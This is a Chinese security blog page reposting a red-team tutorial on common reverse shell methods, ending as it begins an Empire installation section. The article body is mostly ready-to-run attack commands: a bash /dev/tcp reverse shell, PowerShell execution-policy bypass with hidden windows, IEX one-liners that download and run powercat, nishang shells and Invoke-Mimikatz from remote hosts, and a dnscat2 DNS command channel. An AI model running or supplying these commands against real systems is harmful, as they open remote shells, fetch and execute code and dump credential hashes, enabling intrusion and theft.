@@ -1,0 +1,571 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>常见反弹shell方式 | Fstraw Blog</title><meta name="keywords" content="内网渗透"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="转载：原创 三个大石头 系统安全运维 8月9日  本章目录：  有了菜刀的虚拟终端为啥还要反弹shell？ webshell管理工具中虚拟终端不是真正的shell（命令解析器），通过客户端和服务器的webshell共同完成的用于执行命令的模块，当用户在提权时获取的管道是无法通过虚拟终端来使用。虚拟终端无法执行交互式命令、无法控制进程状态、无法补全命令等等，非常不利于提权操作以及横向移动，所以，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见反弹shell方式">
+<meta property="og:url" content="https://ccc-f.github.io/posts/89b04201.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="转载：原创 三个大石头 系统安全运维 8月9日  本章目录：  有了菜刀的虚拟终端为啥还要反弹shell？ webshell管理工具中虚拟终端不是真正的shell（命令解析器），通过客户端和服务器的webshell共同完成的用于执行命令的模块，当用户在提权时获取的管道是无法通过虚拟终端来使用。虚拟终端无法执行交互式命令、无法控制进程状态、无法补全命令等等，非常不利于提权操作以及横向移动，所以，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.853Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.904Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/89b04201"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '常见反弹shell方式',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">常见反弹shell方式<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/89b04201.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.853Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.904Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/">RedTeam</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="常见反弹shell方式"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/89b04201.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/89b04201.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p> 转载：原创 三个大石头 <a href="javascript:void(0);" rel="external nofollow noreferrer">系统安全运维</a> <em>8月9日</em></p>
+</blockquote>
+<p>本章目录：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922152629844.png" alt="image-20210922152629844"></p>
+<p>有了菜刀的虚拟终端为啥还要反弹shell？</p>
+<p>webshell管理工具中虚拟终端不是真正的shell（命令解析器），通过客户端和服务器的webshell共同完成的用于执行命令的模块，当用户在提权时获取的管道是无法通过虚拟终端来使用。虚拟终端无法执行交互式命令、无法控制进程状态、无法补全命令等等，非常不利于提权操作以及横向移动，所以，必须反弹 shell（将目标机器的命令解析器反弹给攻击者或者测试人员，命令解析器的权限取决于WEB服务器的权限，一般情况下，其权限很低）。</p>
+<p>目标机上反弹shell到攻击者的机器，攻击者需要监听nc</p>
+<h4 id="windows-x2F-linux反弹shell"><a href="#windows-x2F-linux反弹shell" class="headerlink" title="windows&#x2F;linux反弹shell"></a><strong>windows&#x2F;linux反弹shell</strong></h4><h5 id="1、bash反弹shell"><a href="#1、bash反弹shell" class="headerlink" title="1、bash反弹shell"></a><strong>1、bash反弹shell</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922152747352.png" alt="image-20210922152747352"></p>
+<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
+<h5 id="2、Powershell反弹shell"><a href="#2、Powershell反弹shell" class="headerlink" title="2、Powershell反弹shell"></a><strong>2、Powershell反弹shell</strong></h5><h6 id="2-1）Powershell介绍"><a href="#2-1）Powershell介绍" class="headerlink" title="2.1）Powershell介绍"></a><strong>2.1）Powershell介绍</strong></h6><p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。</p>
+<p>一旦攻击者可以在一台计算机上运行代码，他们便可以下载powershell脚本文件（.ps1）到磁盘执行，脚本可以在内存中运行(无文件化)。我们可以将powershell看做是命令提示符cmd.exe的扩展。</p>
+<p>优点：</p>
+<p>① WIN7以上默认安装(以下没有)② Powershell脚本可以运行再内存中，不需要写入磁盘③ 可以远程加载Powershell脚本并执行④ 很多安全软件不能检测到Powershell的活动(系统自带)⑤ CMD.exe通常被阻止运行，Powershell不会   ⑥ 可以用来管理活动目录(AD)</p>
+<p>各个系统中Powershell的版本如下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>操作系统</strong></th>
+<th><strong>PowerShell版本</strong></th>
+<th><strong>是否可升级</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Window 7&#x2F;Windows server 2008</strong></td>
+<td>2.0</td>
+<td>可以升级3.0、4.0</td>
+</tr>
+<tr>
+<td><strong>Window 8&#x2F; Windows server 2012</strong></td>
+<td>3.0</td>
+<td>可升级4.0</td>
+</tr>
+<tr>
+<td><strong>Window 8.1&#x2F; Windows server 2012 R2</strong></td>
+<td>4.0</td>
+<td>升级5.0  5.1</td>
+</tr>
+</tbody></table>
+<p>可以在输入Get-Host或者$PSVersionTable.PSVERSION来查看版本信息，如下所示：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922152921834.png" alt="image-20210922152921834"></p>
+<p><em><strong>2.1.1. powershell策略</strong></em></p>
+<p>Get-ExecutionPolicy 查看当前环境执行脚本的策略restricted 不允许执行脚本remotesigned 可以执行本地脚本 但是从网上下载的脚本不能运行allsigned 对签名的脚本才能执行unrestricted 允许执行任意脚本   Set-ExecutionPolicy 设置脚本运行策略</p>
+<p><em><strong>2.1.2. Powershell攻击利用</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 绕过策略加载执行本地文件</span><br><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File xxx.ps1本地隐藏绕过权限执行脚本</span><br><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Nonl IEX (New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;); 用IEX下载远程PS1脚本绕过权限执行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参数说明 </p>
+<p>ExecutionPolicy Bypass : 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全规则;</p>
+<p>WindowStyle Hidden ：隐藏窗口;</p>
+<p>NoLogo : 启动不显示版权标志的PowerShell;</p>
+<p>NonInteractive (-Nonl) : 非交互模式，PowerShell不为用户提供交互的提示;</p>
+<p>NoProfile (-Nop): PowerShell控制台不加载当前用户的配置文件;</p>
+<p>Noexit : 执行后不退出Shell。这在使用键盘记录等脚本时非常重要。</p>
+<h6 id="2-2、Powercat反弹TCP-shell"><a href="#2-2、Powercat反弹TCP-shell" class="headerlink" title="2.2、Powercat反弹TCP - shell"></a><strong>2.2、Powercat反弹TCP - shell</strong></h6><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat.</p>
+<p>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
+<p><em><strong>攻击者监听：（反向）</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nc –lvnp 9999</span><br></pre></td></tr></table></figure>
+
+<p>目标机反弹CMD：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -c 192.168.1.4 -p 9999  -e cmd</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>目标机执行下面的代码：（正向）</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -l -p 9999  -e cmd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机 nc 192.168.40.172 9999</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-3、nishang反弹shell"><a href="#2-3、nishang反弹shell" class="headerlink" title="2.3、nishang反弹shell"></a><strong>2.3、nishang反弹shell</strong></h6><p>Nishang(<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP等类型shell。</p>
+<p>Nishang要在PowerShell3.0以上的环境下才可以正常使用，在window 7或者server2008上可能会出现一些异常。</p>
+<p>导入Nishang模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\nishang.psm1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导入成功后，产看Nishang中模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Command –Module nishang</span><br></pre></td></tr></table></figure>
+
+<p>Nishang攻击模块有（只介绍部分）：</p>
+<p>Check-VM:检测目标机器是否为虚拟机</p>
+<p>Invoke-CredentialsPhish:欺骗目标主机用户，用作钓鱼</p>
+<p>Copy-VSS:利用Volume Shaodow Copy复制sam文件</p>
+<p>FireBuster FireLiStener:用作内网环境扫描</p>
+<p>Keylogger:用作键盘记录</p>
+<p>Invoke-Mimikatz:类似Mimikatz，直接获取系统账号明文密码</p>
+<p>Get-PassHashes:获取系统密码hash值</p>
+<p>ADD-persistence 用作持久化</p>
+<p>ExetoText 作用exe转换为Text</p>
+<p><em><strong>2.3.1 基于TCP的Powershell交互式shell</strong></em></p>
+<p>在目标机上执行如下的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.4 -port 9999</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其中，Invoke-PowerShellTcp是基于TCP协议的Powershell正向连接或者反向连接shell，其参数如下：</p>
+<p>Ø IPAddress 反向连接时设置的IP</p>
+<p>Ø Port 正向连接时设置的端口，前面要写上-Bind参数</p>
+<p>Ø Reverse  反向连接</p>
+<p>Ø Bind 正向连接</p>
+<p><strong>反向连接</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.4 -port 9999</span><br></pre></td></tr></table></figure>
+
+<p>注意：可将nishang下载到攻击者本地，执行如下的代码（此时推荐使用python搭建简易WEB服务）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.14/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1. 4 -port 6666</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>正向连接：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Bind -Port 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em><strong>2.3.2 基于UDP的Poershell交互式Shell</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1&#x27;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.4 -port 5399</span><br></pre></td></tr></table></figure>
+
+<p>或者执行如下的代码（需要导入NIshang的模块）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922153812092.png" alt="image-20210922153812092"></p>
+<p>在攻击者的电脑上执行如下的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lup 6005</span><br></pre></td></tr></table></figure>
+
+<p>上述测试是反向连接，那么正向连接的时候，在攻击者的电脑上运行的命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvu 192.168.1.24 4555</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>*</em>***2.3.****3 基于ICMP的Poershell交互式Shell*</strong>*</p>
+<p>需要借助于icmpsh_m.py文件，其用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh_m.py -h</span><br></pre></td></tr></table></figure>
+
+<p>用法（攻击机器执行）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./icmpsh-m.py &lt;source IP address&gt; &lt;destination IP address&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在被攻击的机器上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellIcmp -IPAddress &lt;source IP address&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em><strong>2.3.4 基于HTTP&#x2F;HTTPS的Poershell交互式Shell</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP: Invoke-PoshRatHttp –IPAddess 192.168.1.4 –Port 4444HTTPS: Invoke-PoshRatHttps  –IPAddess 192.168.1.4 –Port 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后会生成一个powershell如下的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">····IEX  ((New-Object Net.WebClient).DownloadString(‘http://192.168.1.4:4444/connect’))</span><br></pre></td></tr></table></figure>
+
+<p>然后复制该命令在被攻击机器上执行即可，便可看到反弹的shell</p>
+<p><em><strong>2.3.5 Mimikatz模块获取hash密码</strong></em></p>
+<p>目标机运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.40.128/Invoke-Mimikatz.ps1 &#x27;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+
+<p>#运行完会直接显示hash，若是没有kb281977补丁，还可显示明文密码 </p>
+<p>*<strong>2.3.6 Porscan模块扫描端口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.40.128/Invoke-Portscan.ps1 &#x27;);Invoke-Portscan -Hosts 192.168.40.1 -Ports 1-100</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2.4、dnscat2 反弹DNS shell</strong> </p>
+<p>dnscat2(<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a>)</p>
+<p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p>
+<p><strong>Step 1 :</strong> 在linux系统中安装dnscat2（需要ruby环境），然后开始监听:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb --dns &quot;domain=pentest.com,host=192.168.1.32&quot; --no-cache -e open</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2：</strong>在目标主机上执行如下的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;);Start-Dnscat2 -Domain pentest.com -DNSServer 192.168.1.32</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3:</strong> 接着就可以看到反弹过来的shell，输入session -i 1进入第一个会话，输入shell，然后再次输入session -i 2，会看到系统的CMD命令行！！</p>
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="2-5、Empire-反弹shell"><a href="#2-5、Empire-反弹shell" class="headerlink" title="2.5、Empire 反弹shell"></a><strong>2.5、Empire 反弹shell</strong></h6><p>Empire(<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell，它的功能有点类似MSF。</p>
+<p>注意：此工具疯狂报错，极难安装。</p>
+<p>参考连接：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_41320638/article/details/107136821">https://blog.csdn.net/qq_41320638/article/details/107136821</a></p>
+<p><strong><em>*</em>*2.5.**1 安装Empire*</strong>*</p>
